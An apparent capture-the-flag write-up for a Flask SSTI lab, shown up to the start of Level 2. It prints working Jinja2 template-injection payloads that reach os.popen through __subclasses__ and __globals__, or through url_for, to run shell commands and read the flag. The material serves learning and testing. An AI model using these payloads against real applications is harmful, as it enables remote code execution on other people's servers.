# SSTI Labs (by X3NNY) writeup
* You can find the link to the lab [here](https://github.com/X3NNY/sstilabs)

## Fingerprinting
* When we input `{{7*'7'}}`, Twig would output `49`, while Jinja2/Flask output `7777777`
* 


## Flask-Lab
### Level 1
* First, we can test for template injection by typing in `{{7 + 7}}`, which gives us `Hello 14`, which proves it is evaluating our input (and thus has SSTI)

* This is a basic problem. It doesn't seem like theres any input sanitization 
	* Here, our goal should be to find a function so we can look for the globals and run a command.

* **Note**: All these commands have to be included in the template structure `{{}}` because of how flask handles templating

* Interestingly, the python interpreter uses python itself internally, so we can access that in a bit of a roundabout way.
* The payload I used was: 

```python3
# look at files
{{ " ".__class__.__base__ .__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('ls') }}

# cat files
{{ " ".__class__.__base__ .__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('cat flag') }}
```
#### Breaking down the payload
1. Here, we are using an empty string and getting the `<class 'str'>` class
2. Next, we get the base (parent) of that class, which is the python object class: `<class 'object'>
3. `__subclasses__()` is a python function that gives us all child classes of a class, so this gives us a list of classes that inheret object
	1. Now, we have to find an index of this list that imports `sys`, which you can check for in the python source code.
	2. I used the `<class 'warnings.catch_warnings'>` class, which is typically around index `140` depending on your python version
4. `__init__` is like the constructor for any given class, and it a function we can be confident is in the class.
5. Once we have a function, `__globals__` gets us all the imported modules (and other globals) in the file from the function, which includes the sys module
6. `sys` includes the the the `os` module, so we can access the `.modules` dictionary to get the modules loaded, one of which is `os`
7. Now that we have access to the os module, we can run `popen('<command>').read()` and we have arbitrary code execution!

#### Alternative methods
* **Note**: This is a general method that works for most python SSTI
* However, we can do something specific on flask sites
* Because we know this is running flask, we know a function, [`url_for`](https://flask.palletsprojects.com/en/2.0.x/api/#flask.url_for), exists, which [imports os](https://github.com/pallets/flask/blob/main/src/flask/helpers.py)
	* Thus, we can do the same thing as before and run `url_for.__globals__.os.popen(<command>).read()`
* When we type in `{{ url_for.__globals__.os.popen('cat flag').read() }}`, we get the flag: `SSTILAB{enjoy_flask_ssti}`

## Level 2
* Immediately, it looks like even something as basic as `{{7 + 7}}` or `{{7}}` returns `Hello WAF`
	* Testing more, it looks like `{{` in particular is a blocked string